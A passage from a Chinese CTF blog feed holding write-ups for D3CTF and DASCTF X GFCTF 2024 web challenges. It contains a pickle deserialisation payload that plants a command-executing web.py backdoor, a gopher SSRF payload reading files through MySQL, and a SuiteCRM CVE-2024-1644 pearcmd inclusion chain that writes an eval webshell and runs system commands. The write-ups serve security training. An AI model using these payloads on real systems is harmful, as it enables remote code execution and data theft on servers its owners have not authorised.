pickle</span><br><span class="line">import os</span><br><span class="line">import builtins</span><br><span class="line"></span><br><span class="line">code = &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def Backdoor(handler):</span><br><span class="line">    import os</span><br><span class="line">    ctx = __import__(&#x27;web&#x27;).ctx</span><br><span class="line">    print(ctx.env)</span><br><span class="line">    command = ctx.env.get(&#x27;HTTP_COMMAND&#x27;,None)</span><br><span class="line">    if command:</span><br><span class="line">        command_output = os.popen(command).read()</span><br><span class="line">        return command_output</span><br><span class="line">    return handler()</span><br><span class="line"></span><br><span class="line">app.add_processor(Backdoor)</span><br><span class="line">&#x27;&#x27;&#x27;.strip()</span><br><span class="line"></span><br><span class="line">class Exploit:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        cmd = (code,)</span><br><span class="line">        return (builtins.exec, (cmd,))</span><br><span class="line"></span><br><span class="line">pickled_data = pickle.dumps(Exploit(), protocol=0)</span><br><span class="line">import base64</span><br><span class="line">print(base64.b64encode(pickled_data).decode())</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">大伙儿都太厉害了</summary>
    
    
    
    <category term="WriteUp" scheme="http://boogipop.com/categories/WriteUp/"/>
    
    
    <category term="WriteUp" scheme="http://boogipop.com/tags/WriteUp/"/>
    
    <category term="D3CTF" scheme="http://boogipop.com/tags/D3CTF/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF X GFCTF 2024 Writeup</title>
    <link href="http://boogipop.com/2024/04/30/DASCTF%20X%20GFCTF%202024%20Writeup/"/>
    <id>http://boogipop.com/2024/04/30/DASCTF%20X%20GFCTF%202024%20Writeup/</id>
    <published>2024-04-30T06:11:12.609Z</published>
    <updated>2024-04-30T06:15:14.804Z</updated>
    
    <content type="html"><![CDATA[<h1 id="队伍名称"><a href="#队伍名称" class="headerlink" title="队伍名称"></a>队伍名称</h1><p>HnuSec</p><h1 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h1><p>19 名</p><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="cool-index"><a href="#cool-index" class="headerlink" title="cool_index"></a>cool_index</h3><p>签到题，关键逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/article&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">            <span class="keyword">let</span> index = req.<span class="property">body</span>.<span class="property">index</span>;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">index</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;你知道我要说什么&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (decoded.<span class="property">subscription</span> !== <span class="string">&quot;premium&quot;</span> &amp;&amp; index &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">                    .<span class="title function_">status</span>(<span class="number">403</span>)</span><br><span class="line">                    .<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;订阅高级会员以解锁&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            index = <span class="built_in">parseInt</span>(index);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(index) || index &gt; articles.<span class="property">length</span> - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;你知道我要说什么&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">json</span>(articles[index]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            res.<span class="title function_">clearCookie</span>(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;重新登录罢&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;未登录&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面有一堆jwt但实际上都无伤大雅，关键在于这个parseInt以及nodejs的弱类型比较。<br>我们的目标是访问到第七页，但是<code>if (decoded.subscription !== &quot;premium&quot; &amp;&amp; index &gt;= 7) &#123;</code><br>这条判断让我们无法通过，绕过很简单，index&#x3D;<code>7a</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/article</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>c11ecb80-b958-49f7-af22-5d7cd4552a46.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://c11ecb80-b958-49f7-af22-5d7cd4552a46.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://c11ecb80-b958-49f7-af22-5d7cd4552a46.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBvcCIsInN1YnNjcmlwdGlvbiI6Imd1ZXN0IiwiaWF0IjoxNzEzNjIxMzQ5LCJleHAiOjE3MTM3MDc3NDl9.LtXseEZrvF4cBbm9qIVv6DzKY8bDC_z8AJeWXkXJQh4</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>13</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;index&quot;</span><span class="punctuation">:</span><span class="string">&quot;7a&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713621397412-ffced417-d7f8-4bf4-9244-65b5496b7396.png#averageHue=%23e1e7ce&clientId=u65db0307-b4e6-4&from=paste&height=1021&id=u2a1354a5&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=787716&status=done&style=none&taskId=u9f67bfa2-92ef-45c7-a97a-4f9e8250df7&title=&width=1502" alt="image.png"></p><h3 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h3><p>先注册个账号。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713621745126-d2dbeea0-7072-4e0a-a89e-f149fc06e641.png#averageHue=%23b2b2b2&clientId=u8ade7719-3014-4&from=paste&height=241&id=uffb31ef6&originHeight=482&originWidth=1856&originalType=binary&ratio=2&rotation=0&showTitle=false&size=61673&status=done&style=none&taskId=ub8f99483-0784-4eea-84f2-6fe2c6d8e24&title=&width=928" alt="image.png"><br>提示我们不能查看图片，猜测是需要管理员，加上后台有个修改密码的接口，盲猜是任意密码重置<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713621819822-c6c1aac9-e5bb-4fbd-91dd-ac6bbfff3c63.png#averageHue=%23e1e7ce&clientId=u8ade7719-3014-4&from=paste&height=1021&id=u4961cc75&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=812915&status=done&style=none&taskId=u233cbb90-5a82-47ef-852b-f0f3ba3b390&title=&width=1502" alt="image.png"><br>admin密码重置成功。接下来就去登录admin<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713621961978-1c2072bd-382c-4f23-a360-d040d79e2741.png#averageHue=%23dee6c9&clientId=u8ade7719-3014-4&from=paste&height=1021&id=u147726d2&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1374116&status=done&style=none&taskId=u9b55604b-c00c-4fd7-8f70-82d80af03e5&title=&width=1502" alt="image.png"><br>这里应该是个ssrf的接口了，经过fuzz只可以使用gopher协议和http协议，我们可以用http协议探测内网<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713622229095-6be0113b-da11-4dfe-9f08-15edb44d5c3d.png#averageHue=%23e0e6ce&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=u83273b41&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=825830&status=done&style=none&taskId=ucaae45cf-4f44-4579-bfbc-0e7cc8bcc8c&title=&width=1502" alt="image.png"><br>访问3306端口有回显，内容如下</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">J<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00</span><br><span class="line">5.7.29<span class="keyword">\x</span>00<span class="keyword">\x</span>07<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00&gt;&#125;Oy<span class="keyword">\x</span>15<span class="keyword">\x</span>15<span class="comment">%^\x00\xff\xf7\x08\x02\x00\xff\x81\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Dt&gt;v&gt;?6\x1aJgYx\x00mysql_native_password\x00\x1b\x00\x00\x01\xff\x84\x04Got packets out of order</span></span><br></pre></td></tr></table></figure><p>低版本mysql，最终结合gopher协议读取flag文件<br>gopherus生成payload<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713622368239-7f375479-66b8-4e56-9b02-d71e5a0538ae.png#averageHue=%232b2d3f&clientId=u8ada0cda-7857-4&from=paste&height=639&id=u3223906d&originHeight=1278&originWidth=2012&originalType=binary&ratio=2&rotation=0&showTitle=false&size=346686&status=done&style=none&taskId=u9803b863-cde8-411a-b13c-41a4fd83151&title=&width=1006" alt="image.png"><br>别忘了二次编码最终payload如下</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/<span class="built_in">_</span><span class="comment">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2524%2500%2500%2500%2503%2575%2573%2565%2520%2574%2565%2573%2574%253b%2573%2565%256c%2565%2563%2574%2520%256c%256f%2561%2564%255f%2566%2569%256c%2565%2528%2527%252f%2566%256c%2561%2567%2527%2529%253b%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713622418818-19965c85-62aa-497e-bc64-4e4bb1b5254a.png#averageHue=%23d0dacb&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=u51599e3f&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1154377&status=done&style=none&taskId=u505dde6c-5dce-41f4-bde3-ef8037233e5&title=&width=1502" alt="image.png"></p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">J<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00</span><br><span class="line">5.7.29<span class="keyword">\x</span>00<span class="keyword">\x</span>08<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00hT<span class="keyword">\x</span>1a<span class="keyword">\x</span>1f<span class="keyword">\x</span>14r&gt;<span class="keyword">\x</span>00<span class="keyword">\xff</span><span class="keyword">\xf</span>7<span class="keyword">\x</span>08<span class="keyword">\x</span>02<span class="keyword">\x</span>00<span class="keyword">\xff</span><span class="keyword">\x</span>81<span class="keyword">\x</span>15<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00!`<span class="keyword">\x</span>16S<span class="comment">%\x06X\x18SLh\x00mysql_native_password\x00\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00\x10\x00\x00\x01\x00\x00\x00</span></span><br><span class="line">@<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>07<span class="keyword">\x</span>01<span class="keyword">\x</span>05<span class="keyword">\x</span>04test<span class="keyword">\x</span>01<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>02<span class="keyword">\x</span>01(<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>03<span class="keyword">\x</span>03def<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>12load<span class="built_in">_</span>file(&#x27;/flag&#x27;)<span class="keyword">\x</span>00?<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>01<span class="keyword">\xfb</span><span class="keyword">\x</span>80<span class="keyword">\x</span>00<span class="keyword">\x</span>1f<span class="keyword">\x</span>00<span class="keyword">\x</span>00.<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>04-DASCTF&#123;715d9012-12fe-42ce-ae83-18fd4285e99b&#125;</span><br><span class="line"><span class="keyword">\x</span>07<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>05<span class="keyword">\xfe</span><span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>02<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00</span><br></pre></td></tr></table></figure><p>最终得到flag</p><h3 id="SuiteCRM"><a href="#SuiteCRM" class="headerlink" title="SuiteCRM"></a>SuiteCRM</h3><p>没给hint前以为是代码审计题，麻了，最后放hint发现是个简单题，当时犹豫安恒平台的问题导致可能就1解吧。<br>CVE-2024-1644<br><a href="https://github.com/salesagility/SuiteCRM/">https://github.com/salesagility/SuiteCRM/</a><br>根据视频的操作，存在本地文件包含，而且题目又是docker环境，很容易想到pearcmd文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LegacyRedirectHandler.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIncludeFile</span>(<span class="params">Request <span class="variable">$request</span></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">    <span class="variable">$baseUrl</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getPathInfo</span>(); <span class="comment">// Anything after the index.php file</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$baseUrl</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$baseUrl</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$baseUrl</span>, <span class="string">&#x27;.php&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$baseUrl</span> .= <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;dir&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span> =&gt; <span class="variable">$baseUrl</span>, <span class="comment">// Arbitrary path (with custom wrapper)</span></span><br><span class="line">        <span class="string">&#x27;access&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点在于这里，他会对index.php后面的内容本地文件包含。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713624697660-f7cb977b-54b4-4cb1-a199-9be01da59b8b.png#averageHue=%23dee4cc&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=u9dcc40df&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=873901&status=done&style=none&taskId=u57de64d8-645d-48be-a10c-a153ab01904&title=&width=1502" alt="image.png"><br>可以看到返回200了，这一注意是81端口，接下里我们就pear包含，正常流程</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php//usr/local/lib/php/pearcmd.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ce1caa59-d343-4360-8aea-c775d17a6d63.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>LEGACYSESSID=81be055d743282032824d844121dba45; PHPSESSID=04d03e295b41e5622836f3b122e3b963; XSRF-TOKEN=ynCnaUpuQzEUurP2Ak5z9Px7yPb3ywqTxShSRt26LAE; ck_login_id_20=8a4b0568-268c-9812-73b3-65e88ae3bac3; ck_login_language_20=zh_CN; sugar_user_theme=suite8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ce1caa59-d343-4360-8aea-c775d17a6d63.node5.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713625537247-05466423-03db-4543-ad39-df4f48f0bc7e.png#averageHue=%23e1e7cf&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=u55a8811a&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1151069&status=done&style=none&taskId=ua105e9ed-ee16-491b-adcb-bf220558fc7&title=&width=1502" alt="image.png"><br>成功创建test.php，最后本地包含rce即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php//tmp/test.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ce1caa59-d343-4360-8aea-c775d17a6d63.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>LEGACYSESSID=81be055d743282032824d844121dba45; PHPSESSID=04d03e295b41e5622836f3b122e3b963; XSRF-TOKEN=ynCnaUpuQzEUurP2Ak5z9Px7yPb3ywqTxShSRt26LAE; ck_login_id_20=8a4b0568-268c-9812-73b3-65e88ae3bac3; ck_login_language_20=zh_CN; sugar_user_theme=suite8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ce1caa59-d343-4360-8aea-c775d17a6d63.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">cmd</span>=system(<span class="string">&#x27;cat /flag&#x27;</span>)<span class="comment">;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713625622590-bb470995-5bfb-4d9a-9193-3fe51c1c9503.png#averageHue=%23dee6c9&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=ue1bcc46c&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1169025&status=done&style=none&taskId=u52a6e745-2b9b-48f4-99f4-1674ec28849&title=&width=1502" alt="image.png"></p><h3 id="Web1234（赛后解）"><a href="#Web1234（赛后解）" class="headerlink" title="Web1234（赛后解）"></a>Web1234（赛后解）</h3><p>开局<a href="http://www.zip泄露/">www.zip泄露</a><br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="variable">$param</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] === <span class="variable">$Config</span>-&gt;uname &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>])) === <span class="variable">$Config</span>-&gt;passwd)&#123;</span><br><span class="line">    <span class="variable">$Admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$Config</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>] === <span class="string">&#x27;edit&#x27;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$avatar</span>[<span class="string">&#x27;fname&#x27;</span>] = <span class="variable">$_FILES</span>[<span class="string">&#x27;avatar&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$avatar</span>[<span class="string">&#x27;fdata&#x27;</span>] = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;avatar&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$param</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$sex</span> = <span class="variable">$param</span>[<span class="string">&#x27;sex&#x27;</span>];</span><br><span class="line">        <span class="variable">$mail</span> = <span class="variable">$param</span>[<span class="string">&#x27;mail&#x27;</span>];</span><br><span class="line">        <span class="variable">$telnum</span> = <span class="variable">$param</span>[<span class="string">&#x27;telnum&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$Admin</span>-&gt;<span class="title function_ invoke__">editconf</span>(<span class="variable">$avatar</span>, <span class="variable">$nickname</span>, <span class="variable">$sex</span>, <span class="variable">$mail</span>, <span class="variable">$telnum</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>] === <span class="string">&#x27;reset&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$Admin</span>-&gt;<span class="title function_ invoke__">resetconf</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;pls login! :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td 